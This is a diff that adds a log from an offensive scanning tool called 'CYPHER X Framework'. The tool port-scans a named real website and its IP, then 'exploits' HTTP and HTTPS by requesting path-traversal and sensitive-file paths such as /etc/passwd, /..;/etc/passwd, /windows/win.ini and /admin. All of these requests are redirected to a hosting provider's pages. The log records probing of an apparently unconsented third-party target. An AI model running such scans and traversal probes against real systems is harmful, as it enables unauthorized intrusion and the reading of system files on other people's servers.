@@ -1,0 +1,49 @@
+2026-03-20 21:45:38,163 | INFO | [92mCYPHER X Framework initialized successfully[0m
+2026-03-20 21:45:38,166 | INFO | [1mTarget: wearelao.com[0m
+2026-03-20 21:45:38,167 | INFO | Ports to scan: 3
+2026-03-20 21:45:38,317 | INFO | Resolved IP: 151.106.103.49
+2026-03-20 21:45:38,319 | INFO | [95mStarting CYPHER X scan on 151.106.103.49[0m
+2026-03-20 21:45:38,808 | INFO | [92m[+] Port 80 open[0m
+2026-03-20 21:45:38,813 | INFO | [92m[+] Port 443 open[0m
+2026-03-20 21:45:43,411 | INFO | [92mFound 2 open ports[0m
+2026-03-20 21:45:43,413 | INFO | [95mExploiting port 80...[0m
+2026-03-20 21:45:43,445 | INFO | [95mExploiting HTTP on 151.106.103.49:80[0m
+2026-03-20 21:45:44,494 | DEBUG | Starting new HTTP connection (1): 151.106.103.49:80
+2026-03-20 21:45:45,186 | DEBUG | http://151.106.103.49:80 "GET / HTTP/1.1" 302 771
+2026-03-20 21:45:45,192 | DEBUG | Starting new HTTPS connection (1): www.hosting24.com:443
+2026-03-20 21:45:45,662 | DEBUG | https://www.hosting24.com:443 "GET / HTTP/1.1" 301 0
+2026-03-20 21:45:45,671 | DEBUG | Starting new HTTPS connection (1): www.hostinger.com:443
+2026-03-20 21:45:46,014 | DEBUG | https://www.hostinger.com:443 "GET / HTTP/1.1" 200 None
+2026-03-20 21:45:46,068 | DEBUG | Starting new HTTP connection (1): 151.106.103.49:80
+2026-03-20 21:45:46,697 | DEBUG | http://151.106.103.49:80 "GET /etc/passwd HTTP/1.1" 302 771
+2026-03-20 21:45:46,703 | DEBUG | Starting new HTTPS connection (1): www.hosting24.com:443
+2026-03-20 21:45:46,977 | DEBUG | https://www.hosting24.com:443 "GET / HTTP/1.1" 301 0
+2026-03-20 21:45:46,986 | DEBUG | Starting new HTTPS connection (1): www.hostinger.com:443
+2026-03-20 21:45:47,327 | DEBUG | https://www.hostinger.com:443 "GET / HTTP/1.1" 200 None
+2026-03-20 21:45:47,424 | DEBUG | Starting new HTTP connection (1): 151.106.103.49:80
+2026-03-20 21:45:47,986 | DEBUG | http://151.106.103.49:80 "GET /..;/etc/passwd HTTP/1.1" 302 771
+2026-03-20 21:45:47,992 | DEBUG | Starting new HTTPS connection (1): www.hosting24.com:443
+2026-03-20 21:45:48,241 | DEBUG | https://www.hosting24.com:443 "GET / HTTP/1.1" 301 0
+2026-03-20 21:45:48,248 | DEBUG | Starting new HTTPS connection (1): www.hostinger.com:443
+2026-03-20 21:45:48,535 | DEBUG | https://www.hostinger.com:443 "GET / HTTP/1.1" 200 None
+2026-03-20 21:45:48,595 | DEBUG | Starting new HTTP connection (1): 151.106.103.49:80
+2026-03-20 21:45:49,248 | DEBUG | http://151.106.103.49:80 "GET /windows/win.ini HTTP/1.1" 302 771
+2026-03-20 21:45:49,256 | DEBUG | Starting new HTTPS connection (1): www.hosting24.com:443
+2026-03-20 21:45:49,498 | DEBUG | https://www.hosting24.com:443 "GET / HTTP/1.1" 301 0
+2026-03-20 21:45:49,504 | DEBUG | Starting new HTTPS connection (1): www.hostinger.com:443
+2026-03-20 21:45:49,764 | DEBUG | https://www.hostinger.com:443 "GET / HTTP/1.1" 200 None
+2026-03-20 21:45:49,816 | DEBUG | Starting new HTTP connection (1): 151.106.103.49:80
+2026-03-20 21:45:50,384 | DEBUG | http://151.106.103.49:80 "GET /admin HTTP/1.1" 302 771
+2026-03-20 21:45:50,392 | DEBUG | Starting new HTTPS connection (1): www.hosting24.com:443
+2026-03-20 21:45:50,608 | DEBUG | https://www.hosting24.com:443 "GET / HTTP/1.1" 301 0
+2026-03-20 21:45:50,613 | DEBUG | Starting new HTTPS connection (1): www.hostinger.com:443
+2026-03-20 21:45:50,896 | DEBUG | https://www.hostinger.com:443 "GET / HTTP/1.1" 200 None
+2026-03-20 21:45:51,093 | INFO | [95mExploiting port 443...[0m
+2026-03-20 21:45:51,095 | INFO | [95mExploiting HTTPS on 151.106.103.49:443[0m
+2026-03-20 21:45:51,823 | DEBUG | Starting new HTTPS connection (1): 151.106.103.49:443
+2026-03-20 21:45:52,841 | DEBUG | https://151.106.103.49:443 "GET / HTTP/1.1" 302 771
+2026-03-20 21:45:52,848 | DEBUG | Starting new HTTPS connection (1): www.hosting24.com:443
+2026-03-20 21:45:53,163 | DEBUG | https://www.hosting24.com:443 "GET / HTTP/1.1" 301 0
+2026-03-20 21:45:53,168 | DEBUG | Starting new HTTPS connection (1): www.hostinger.com:443
+2026-03-20 21:45:53,428 | DEBUG | https://www.hostinger.com:443 "GET / HTTP/1.1" 200 None
+2026-03-20 21:45:53,503 | INFO | [92mResults saved to cypher_x_20260320_214553.json[0m
